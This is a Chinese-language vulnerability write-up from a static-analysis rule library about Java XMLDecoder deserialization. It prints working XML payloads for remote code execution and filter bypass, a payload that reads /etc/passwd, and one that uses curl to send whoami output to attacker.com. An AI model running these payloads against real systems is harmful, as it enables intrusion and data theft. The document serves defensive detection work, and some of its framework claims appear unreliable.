# Java XMLDecoder反序列化漏洞 完整描述

> 来源：ChanziSAST 规则库语义规则提取（知识整理，含中文漏洞详解）。
> 规则 ID：`any_XMLDecoder_deserialization` · 类别：deser · 关键 sink：（cypher 结构提取，见原文）
> 说明：原文为 cypher 语义查询（不可直接挂 semgrep），下方「知识正文」为规则自带的中文漏洞详解，
> 提取时未改写；配合 fortify-kingdom-reference 的定级指南与各语言 sink 手册使用。


## Java XMLDecoder反序列化漏洞 完整描述
XMLDecoder是Java SE提供的一个内置类（位于`java.beans`包下），用于将XML格式的数据反序列化为Java对象，其设计初衷是简化XML到Java对象的转换，但因自身的解析逻辑和动态执行特性，成为典型的反序列化漏洞载体。该漏洞核心风险在于：攻击者可构造恶意XML payload，触发XMLDecoder执行任意Java代码，进而控制目标系统。


## 一、漏洞基础原理
### 1. XMLDecoder的核心特性
XMLDecoder本质是一个“XML驱动的Java对象构造器”，其解析逻辑并非简单的静态数据映射，而是支持解析并执行JavaBean的实例化、方法调用、字段访问等动态操作：
- 支持通过`<object>`标签实例化任意可访问的Java类；
- 支持通过`<method>`标签调用类的静态/实例方法；
- 支持通过`<field>`标签访问类的静态/实例字段；
- 支持通过`<void>`标签执行无返回值的方法（核心风险点）。

与Java原生的序列化（ObjectInputStream）不同，XMLDecoder不依赖`Serializable`接口，仅需目标类可被反射访问，因此攻击面更广。

### 2. 漏洞触发的核心逻辑
当程序未对XMLDecoder的输入做严格校验，直接将不可信XML数据传入`XMLDecoder.readObject()`方法时，攻击者构造的恶意XML会被解析并执行其中的代码逻辑，完成任意代码执行（RCE）。


## 二、漏洞触发的核心场景
XMLDecoder漏洞的触发需满足两个前提：
1. 程序中使用`XMLDecoder`解析**不可信来源**的XML数据（如HTTP请求体、文件、外部接口响应等）；
2. 未对XML内容做严格的白名单校验（如仅允许特定标签/类/方法）。

以下是典型的触发场景分类：

### 场景1：基础RCE（执行系统命令）
通过XMLDecoder调用Java中可执行系统命令的类（如`Runtime`、`ProcessBuilder`），构造恶意XML执行任意系统命令。

#### 示例Payload（调用Runtime.exec）：
```xml
<?xml version="1.0" encoding="UTF-8"?>
<java version="1.8.0_20" class="java.beans.XMLDecoder">
  <object class="java.lang.Runtime" method="getRuntime">
    <void method="exec">
      <array class="java.lang.String" length="1">
        <void index="0">
          <string>calc.exe</string> <!-- Windows下启动计算器，可替换为任意命令 -->
        </void>
      </array>
    </void>
  </object>
</java>
```

#### 变种（ProcessBuilder方式）：
```xml
<?xml version="1.0" encoding="UTF-8"?>
<java version="1.8.0_20" class="java.beans.XMLDecoder">
  <object class="java.lang.ProcessBuilder">
    <array class="java.lang.String" length="1">
      <void index="0">
        <string>ls</string> <!-- Linux下执行ls命令 -->
      </void>
    </array>
    <void method="start"/>
  </object>
</java>
```

### 场景2：绕过简单过滤（无参方法/静态方法调用）
若程序对`Runtime`、`ProcessBuilder`做了简单关键词过滤，攻击者可通过“类加载+静态方法”“链式调用”等方式绕过：

#### 示例1：通过Class.forName加载Runtime（绕过直接关键词过滤）
```xml
<?xml version="1.0" encoding="UTF-8"?>
<java version="1.8.0_20" class="java.beans.XMLDecoder">
  <object class="java.lang.Class" method="forName">
    <string>java.lang.Runtime</string>
    <void method="getMethod">
      <string>getRuntime</string>
      <array class="java.lang.Class" length="0"/>
    </void>
    <void method="invoke">
      <null/>
      <array class="java.lang.Object" length="0"/>
    </void>
    <void method="exec">
      <string>whoami</string>
    </void>
  </object>
</java>
```

#### 示例2：通过静态字段间接调用（绕过方法名过滤）
```xml
<?xml version="1.0" encoding="UTF-8"?>
<java version="1.8.0_20" class="java.beans.XMLDecoder">
  <field class="java.lang.System" name="out">
    <void method="println">
      <object class="java.lang.Runtime" method="getRuntime">
        <void method="exec">
          <string>cat /etc/passwd</string>
        </void>
      </object>
    </void>
  </field>
</java>
```

### 场景3：低权限/受限环境下的攻击
若目标系统做了权限限制（如禁用`exec`方法），攻击者可通过XMLDecoder执行其他恶意操作：
1. **读取敏感文件**：调用`FileReader`/`BufferedReader`读取系统敏感文件（如`/etc/passwd`、`application.properties`）；
   ```xml
   <?xml version="1.0" encoding="UTF-8"?>
   <java version="1.8.0_20" class="java.beans.XMLDecoder">
     <object class="java.io.BufferedReader">
       <object class="java.io.FileReader">
         <string>/etc/passwd</string>
       </object>
       <void method="readLine">
         <void method="println">
           <field class="java.lang.System" name="out"/>
         </void>
       </void>
     </object>
   </java>
   ```
2. **写入恶意文件**：调用`FileWriter`写入后门文件（如JSP后门）；
3. **修改内存数据**：通过反射修改程序运行时的关键字段（如权限标志、配置参数）；
4. **发起网络请求**：调用`URL`/`HttpURLConnection`向攻击者服务器回传数据（如敏感信息泄露）。

### 场景4：嵌套/链式调用（复杂Payload）
针对更严格的过滤规则，攻击者可通过多层嵌套调用、间接类依赖构造Payload，例如：
```xml
<?xml version="1.0" encoding="UTF-8"?>
<java version="1.8.0_20" class="java.beans.XMLDecoder">
  <object id="r" class="java.lang.Runtime" method="getRuntime"/>
  <object id="cmd" class="java.lang.String" value="curl http://attacker.com/leak?data=$(whoami)"/>
  <void target="r" method="exec">
    <object ref="cmd"/>
  </void>
</java>
```
该Payload通过`id`和`ref`标签复用对象，降低关键词密度，绕过简单的正则过滤。

### 场景5：与其他漏洞结合（扩大影响）
XMLDecoder漏洞常与其他漏洞结合形成完整攻击链：
- **文件上传+XMLDecoder**：上传包含恶意XML的文件，程序通过XMLDecoder解析该文件触发RCE；
- **SSRF+XMLDecoder**：通过SSRF访问内网服务的XMLDecoder接口，攻击内网系统；
- **反序列化+内存马**：通过XMLDecoder注入Java内存马（如Tomcat Filter马），持久化控制目标系统。


## 三、影响范围与版本特性
### 1. 受影响的Java版本
XMLDecoder从JDK 1.4开始引入，所有JDK版本（包括JDK 8、11、17等）均存在该漏洞，核心原因是XMLDecoder的解析逻辑未做安全限制，而非版本漏洞。

### 2. 框架/组件中的典型应用场景
XMLDecoder不仅出现在自研代码中，还广泛存在于开源框架/组件中：
- **Struts1**：部分版本使用XMLDecoder解析配置/请求参数；
- **Spring**：早期版本的Spring MVC/Spring Batch可能通过XMLDecoder解析XML请求；
- **Apache Commons Beanutils**：间接依赖XMLDecoder的场景；
- **自研XML解析组件**：开发人员误用XMLDecoder替代普通XML解析器（如DOM/SAX）处理不可信数据。

### 3. 与XStream/Jackson XML的区别
XMLDecoder漏洞与XStream、Jackson XML的反序列化漏洞不同：
- XStream漏洞依赖特定的类映射规则，而XMLDecoder直接支持反射调用；
- Jackson XML仅做数据绑定，默认不执行方法，而XMLDecoder天然支持方法执行；
- XMLDecoder无需依赖第三方库，仅使用JDK内置类，攻击门槛更低。


## 四、漏洞触发的关键条件总结
1. **输入可控**：XML数据来源于不可信来源（用户输入、外部接口等）；
2. **无有效校验**：未对XML标签（如`<object>`/`<method>`/`<field>`）、类名、方法名做白名单限制；
3. **调用敏感方法**：XMLDecoder解析流程中允许实例化危险类（Runtime、ProcessBuilder等）或调用危险方法（exec、read、write等）；
4. **权限足够**：运行XMLDecoder的Java进程具备执行恶意操作的权限（如执行系统命令、读写文件）。

该漏洞的核心危害是“任意代码执行”，一旦触发，攻击者可完全控制目标系统，造成数据泄露、系统沦陷、横向渗透等严重后果。

